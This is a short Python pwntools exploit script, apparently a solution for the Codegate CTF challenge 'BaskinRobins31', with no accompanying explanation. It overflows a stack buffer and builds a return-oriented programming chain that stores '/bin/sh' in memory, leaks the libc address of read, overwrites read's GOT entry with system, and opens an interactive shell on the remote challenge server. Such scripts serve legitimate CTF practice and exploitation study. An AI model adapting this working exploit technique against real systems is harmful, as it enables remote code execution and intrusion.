from pwn import *

context.log_level='debug'

#s=process('BaskinRobins31')
s=remote('ch41l3ng3s.codegate.kr', 3131)
e=ELF('BaskinRobins31')

pop_rdi_ret=0x0000000000400bc3
#pop_rsi_ret=0x0000000000400bc1
#pop_rdx_ret=0x40087c
pop_ma=0x000000000040087b

bss=0x6020b0

s.recvuntil('How many numbers do you want to take ? (1-3)')

raw_input('1')

payload='A'*0xb8
payload+=p64(pop_rdi_ret)
payload+=p64(0)
payload+=p64(pop_ma)
payload+=p64(bss)
#payload+=p64(pop_rdx_ret)
payload+=p64(len("/bin/sh\00"))
payload+=p64(e.plt['read'])

payload+=p64(pop_rdi_ret)
payload+=p64(1)
payload+=p64(pop_ma)
payload+=p64(e.got['read'])
#payload+=p64(pop_rdx_ret)
payload+=p64(0x8)
payload+=p64(e.plt['write'])

payload+=p64(pop_rdi_ret)
payload+=p64(0)
payload+=p64(pop_ma)
payload+=p64(e.got['read'])
#payload+=p64(pop_rdx_ret)
payload+=p64(0x8)
payload+=p64(e.plt['read'])

payload+=p64(pop_rdi_ret)
payload+=p64(bss)
payload+=p64(e.plt['read'])

s.sendline(payload)

s.send('/bin/sh\00')

s.recvuntil("Don't break the rules...:(")
s.recv(2)

read_libc=u64(s.recv(6).ljust(8,'\x00'))
system_libc=read_libc-0xb1ec0

print hex(read_libc)

s.send(p64(system_libc))

s.interactive()
